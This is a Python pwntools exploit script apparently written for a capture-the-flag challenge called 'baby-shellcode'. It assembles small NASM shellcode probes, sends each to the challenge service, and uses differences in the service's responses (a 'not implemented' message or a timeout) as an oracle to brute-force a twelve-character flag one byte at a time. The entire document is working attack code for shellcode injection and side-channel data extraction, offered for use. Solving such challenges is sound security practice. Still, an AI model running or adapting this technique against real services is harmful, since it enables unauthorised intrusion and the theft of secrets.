#!/usr/bin/env python3
from pwn import *
from subprocess import run
import string

# =========================================================
#                          SETUP                         
# =========================================================
exe = './baby-shellcode'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'warning'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'baby-shellcode.serv1.cbd2025.cloud', 443

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *hookers
# breakrva 0x14be
breakrva 0x13ee

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
CANDS = [ord(c) for c in (string.ascii_letters + string.digits + "_")]
N = 12
CONNECT_TIMEOUT = 4
RECV_TIMEOUT = 2

def make_asm(idx:int, guess:int, fname='probe.s'):
    asm = f"""BITS 64
DEFAULT REL
section .text
global _start

_start:
    mov     rdi, {idx}
    xor     rax, rax
    syscall

    cmp     al, byte {guess}
    jne     .wrong

.correct:
    mov rax, 1
    syscall

.wrong:
    mov     rax, 2
    syscall
"""
    with open(fname, 'wb') as f:
        f.write(asm.encode())
    return fname

def assemble(asmfile, outbin):
    try:
        run(['nasm', '-f', 'bin', asmfile, '-o', outbin], check=True)
    except ChildProcessError as e:
        log.error(f"nasm failed: {e}")
        raise

def test_probe(shellcode_bytes):
    io = None
    try:
        io = initialize()
        io.sendlineafter(b':', shellcode_bytes, timeout=CONNECT_TIMEOUT)
        try:
            data = io.recvall(timeout=RECV_TIMEOUT)
            if b'not implemented' in data:
                return True
            return False
        except EOFError:
            return False
        except TimeoutError:
            return True
        except Exception as e:
            log.warning(f"recv exception: {e!r}")
            return False
    except Exception as e:
        log.warning(f"connection failed: {e!r}")
        return False
    finally:
        if io:
            try:
                # pause()
                io.close()
            except Exception:
                pass

def exploit():
    flag = bytearray(b'?' * N)
    tmp_asm = 'probe.s'
    tmp_bin = 'probe.bin'

    for idx in range(N):
        log.warning(f"Bruteforcing idx {idx}...")
        found = False
        for ch in CANDS:
            log.warning(f'Trying {chr(ch)}')
            # build asm & assemble
            make_asm(idx, ch, fname=tmp_asm)
            assemble(tmp_asm, tmp_bin)
            shellcode = open(tmp_bin, 'rb').read()

            ok = test_probe(shellcode)
            if ok:
                log.warning(f"Found idx {idx}: 0x{ch:02x} ('{chr(ch)}')")
                flag[idx] = ch
                found = True
                try:
                    os.remove(tmp_asm)
                    os.remove(tmp_bin)
                except Exception:
                    pass
                break
            else:
                pass

        if not found:
            log.warning(f"No printable candidate found for index {idx}. You may need to expand CANDS.")
        else:
            time.sleep(0.2)

        try:
            printable = ''.join(chr(b) if 0x20 <= b <= 0x7e else '?' for b in flag)
            log.warning(f"Partial: {printable}")
        except Exception:
            pass

    log.success("Done. Final flag guess: " + ''.join(chr(b) if b != 63 else '?' for b in flag))

if __name__ == '__main__':
    exploit()
